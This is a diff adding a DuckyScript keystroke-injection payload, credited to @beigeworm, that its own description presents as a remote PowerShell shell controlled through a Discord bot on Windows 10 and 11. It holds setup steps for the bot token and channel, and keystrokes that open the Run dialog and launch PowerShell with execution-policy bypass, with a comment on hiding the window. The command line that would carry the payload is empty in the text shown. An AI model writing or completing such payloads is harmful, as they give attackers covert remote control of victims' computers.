@@ -1,0 +1,20 @@
+REM Title: Simple Discord BOT CLI
+REM Author: @beigeworm
+REM Description: Using a Discord Server Chat as a remote powershell connection / CLI
+REM Target: Windows 10 and 11
+
+REM SETUP
+REM make a discord bot at https://discord.com/developers/applications/
+REM add the bot to your discord server
+REM Change BOT_TOKEN below with your bot token
+REM Change CHANNEL_ID below to your channel id
+
+REM open powershell (remove "-W H" to show the window)
+DELAY 1000
+GUI r
+DELAY 750
+STRING powershell -Ep Bypass
+ENTER
+DELAY 5000
+STRING
+ENTER
